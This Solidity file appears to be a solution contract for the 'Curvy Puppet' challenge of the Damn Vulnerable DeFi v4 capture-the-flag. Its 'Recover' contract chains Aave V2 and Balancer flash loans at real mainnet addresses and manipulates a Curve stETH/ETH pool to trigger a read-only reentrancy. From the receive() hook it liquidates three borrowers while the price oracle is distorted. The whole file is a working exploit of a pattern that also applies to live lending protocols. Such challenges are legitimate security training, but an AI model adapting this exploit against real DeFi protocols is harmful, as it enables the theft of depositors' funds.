// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}
interface IBalancerVault {

    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

}

contract Recover {
    IERC20 lpToken;
    IERC20 stETH;
    WETH weth;
    DamnValuableToken dvt;
    IStableSwap curvePool;
    CurvyPuppetLending lending;
    IPermit2 permit2;
    address treasury;
    address[3] users;

    IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    constructor(
        IERC20 _lpToken,
        IERC20 _stETH,
        WETH _weth,
        DamnValuableToken _dvt,
        IStableSwap _curvePool,
        CurvyPuppetLending _lending,
        IPermit2 _permit2,
        address _treasury,
        address[3] memory _users
    ) {
        lpToken = _lpToken;
        stETH = _stETH;
        weth = _weth;
        dvt = _dvt;
        curvePool = _curvePool;
        lending = _lending;
        permit2 = _permit2;
        treasury = _treasury;
        for (uint256 i = 0; i < 3; i++) {
            users[i] = _users[i];
        }
    }

    function recover() external {
        //call flashloan from Aave V2
        stETH.approve(address(AaveV2), 172000 * 1e18 * 1.0009);
        weth.approve(address(AaveV2), 20500 * 1e18 * 1.0009);

        address[] memory assets = new address[](2);
        assets[0] = address(stETH);
        assets[1] = address(weth);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 172000 * 1e18;
        amounts[1] = 20500 * 1e18;
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;
 
        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);

        // Transfer all recovered assets to treasury
        weth.transfer(treasury, weth.balanceOf(address(this)));
        lpToken.transfer(treasury, 1);
        dvt.transfer(treasury, 7500e18);
    }

    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) external returns (bool) {     
        //AaveV2 Flashloan callback logic
        //Call Balancer flashloan
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 37991 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
        return true;
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        //Balancer Flashloan callback logic
        lpToken.approve(address(permit2), type(uint256).max);
 
        permit2.approve({
            token: curvePool.lp_token(),
            spender: address(lending),
            amount: 5e18,
            expiration: uint48(block.timestamp)
        });

        // 1. Manipulate Curve Pool by adding Liquidity

        weth.withdraw(58685 ether);
        stETH.approve(address(curvePool),stETH.balanceOf(address(this)));

        uint256[2] memory amount;
        amount[0] = 58685 ether;
        amount[1] = stETH.balanceOf(address(this));
        curvePool.add_liquidity{value: 58685 ether}(amount, 0); 

        //2. Remove liquidity from Curve Pool to get LP tokens and cause read-only reentrancy 
        uint256 lpBalance = lpToken.balanceOf(address(this));
        lpToken.approve(address(curvePool), lpBalance);
        curvePool.remove_liquidity(lpBalance - 3000000000000000001, [uint256(0), uint256(0)]);

        // 3.Start to revert tokens
        weth.deposit{value: 37991 ether}();
        weth.transfer(address(Balancer), 37991 ether);

        uint256 ethAmount = 12963923469069977697655;
        uint256 min_dy = 1; 
        curvePool.exchange{value: ethAmount}(0, 1, ethAmount, min_dy);
        weth.deposit{value: 20518 ether}();
    }

    receive() external payable {
        // Detect reentrancy during remove liquidity
        // On receive ETH logic, liquidate all users
        if (msg.sender == address(curvePool)) {
            for (uint256 i = 0; i < 3; i++) {
                lending.liquidate(users[i]);
            }
        }
    }
}